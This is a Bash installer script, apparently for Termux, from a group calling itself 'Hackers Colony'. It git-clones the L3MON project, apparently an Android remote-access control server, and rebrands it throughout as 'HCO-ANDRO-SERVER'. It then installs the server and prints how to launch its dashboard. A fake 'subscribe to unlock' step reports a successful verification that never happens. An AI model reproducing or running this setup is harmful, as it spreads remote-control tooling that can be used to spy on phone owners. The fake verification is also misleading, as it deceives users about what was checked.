#!/bin/bash

# Screen clear karein
clear

# Step 1: Elite ASCII ART (Green Color)
echo -e "\e[1;32m"
echo "  _    _  _____  ____              _   _ _____  _____   ____  "
echo " | |  | |/ ____|/ __ \      /\    | \ | |  __ \|  __ \ / __ \ "
echo " | |__| | |    | |  | |    /  \   |  \| | |  | | |__) | |  | |"
echo " |  __  | |    | |  | |   / /\ \  | . \` | |  | |  _  /| |  | |"
echo " | |  | | |____| |__| |  / ____ \ | |\  | |__| | | \ \| |__| |"
echo " |_|  |_|\_____|\____/  /_/    \_\_| \_|_____/|_|  \_\\____/ "
echo -e "\e[0m"

# Step 2: Welcome & Branding
echo -e "\e[1;33m       WELCOME TO HACKERS COLONY - ANDROID SERVER \e[0m"
echo -e "\e[1;36m              Created by: Azhar (HCO Team) \e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"

# Step 3: Lock Logic
echo -e "\n\e[1;31m  [!] ALERT: THIS TOOL IS CURRENTLY LOCKED! \e[0m"
echo -e "\e[1;37m  To unlock and use this tool, you MUST subscribe to\e[0m"
echo -e "\e[1;37m  our YouTube channel first.\e[0m"
echo -e "\n\e[1;34m  🔗 YouTube Link: \e[4mhttps://youtube.com/@hackers_colony_tech\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"

echo -e "\n\e[1;33m  [?] Have you subscribed? (Press ENTER to verify & install)\e[0m"
read -p "" 

# Verification message
echo -e "\e[1;32m  [*] Verification Successful! Starting Installation...\e[0m"
sleep 2

# Step 4: Installation Starts
echo -e "\n\e[1;34m[*] Installing Dependencies...\e[0m"
apt update && apt upgrade -y
pkg install nodejs git python openjdk-17 -y > /dev/null 2>&1
npm install pm2 -g > /dev/null 2>&1

# Core Setup
echo -e "\e[1;34m[*] Building HCO-ANDRO Core Engine...\e[0m"
git clone https://github.com/D3VL/L3MON.git .core_engine > /dev/null 2>&1
mv .core_engine/* .
rm -rf .core_engine

# Custom Branding (No Lemon)
grep -rl "L3MON" . | xargs sed -i 's/L3MON/HCO-ANDRO-SERVER/g' > /dev/null 2>&1

# Server Setup
echo -e "\e[1;34m[*] Finalizing Private Server Modules...\e[0m"
cd server
npm install > /dev/null 2>&1

# Success Message
clear
echo -e "\e[1;32m"
echo "──────────────────────────────────────────────────────────"
echo "         ✅ HCO-ANDRO-SERVER BY AZHAR IS READY!          "
echo "──────────────────────────────────────────────────────────"
echo -e "\e[0m"
echo -e "\e[1;33m  🚀 Start Dashboard: \e[1;37mpm2 start index.js\e[0m"
echo -e "\e[1;33m  🌐 Access URL     : \e[1;37mhttp://localhost:22533\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────────────\e[0m"
